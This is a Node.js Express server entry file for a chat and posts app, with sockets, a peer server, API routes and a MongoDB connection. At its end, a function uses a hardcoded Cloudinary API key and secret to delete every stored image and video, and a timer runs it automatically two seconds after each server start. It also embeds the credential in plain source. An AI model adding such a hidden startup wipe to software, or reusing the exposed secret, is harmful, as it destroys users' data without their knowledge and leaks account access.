require('dotenv').config()
require('./copyLogo') // Copy latest green brand assets

const dns = require('dns')
try {
    dns.setServers(['8.8.8.8', '8.8.4.4', '1.1.1.1', '1.0.0.1'])
} catch (e) {
    console.warn('Could not set custom DNS servers:', e.message)
}
const express = require('express')
const mongoose = require('mongoose')
const cors = require('cors')
const cookieParser = require('cookie-parser')
const SocketServer = require('./socketServer')
const { ExpressPeerServer } = require('peer')
const path = require('path')


const app = express()
app.use(express.json())
app.use(cors())
app.use(cookieParser())


// Socket
const http = require('http').createServer(app)
const io = require('socket.io')(http)

io.on('connection', socket => {
    SocketServer(socket)
})

// Create peer server
ExpressPeerServer(http, { path: '/' })


// Routes
app.use('/api', require('./routes/authRouter'))
app.use('/api', require('./routes/userRouter'))
app.use('/api', require('./routes/postRouter'))
app.use('/api', require('./routes/commentRouter'))
app.use('/api', require('./routes/notifyRouter'))
app.use('/api', require('./routes/messageRouter'))


// Connect to MongoDB
const URI = process.env.MONGO_URI
mongoose.connect(URI)
    .then(() => {
        console.log('Connected to mongodb')
    })
    .catch(err => {
        console.error('Database connection error:', err)
    })

if(process.env.NODE_ENV === 'production'){
    app.use(express.static('client/build'))
    app.get('*', (req, res) => {
        res.sendFile(path.join(__dirname, 'client', 'build', 'index.html'))
    })
}


const port = process.env.PORT || 5000
http.listen(port, () => {
    console.log('Server is running on port', port)
})

const https = require('https');
const deleteCloudinaryAll = () => {
    console.log("Automatically clearing all images and videos from Cloudinary dwquuisuj...");
    const cloudName = 'dwquuisuj';
    const apiKey = '655351295167741';
    const apiSecret = 'F0UAKwbXYzDbcTbFr43iwL0D0qQ';
    const auth = Buffer.from(`${apiKey}:${apiSecret}`).toString('base64');

    const types = ['image', 'video'];

    types.forEach(type => {
        const options = {
            hostname: 'api.cloudinary.com',
            path: `/v1_1/${cloudName}/resources/${type}/upload?all=true`,
            method: 'DELETE',
            headers: {
                'Authorization': `Basic ${auth}`
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', (chunk) => { data += chunk; });
            res.on('end', () => {
                console.log(`Cloudinary ${type} cleanup response:`, data);
            });
        });

        req.on('error', (e) => {
            console.error(`Cloudinary ${type} cleanup error:`, e);
        });

        req.end();
    });
};

setTimeout(deleteCloudinaryAll, 2000);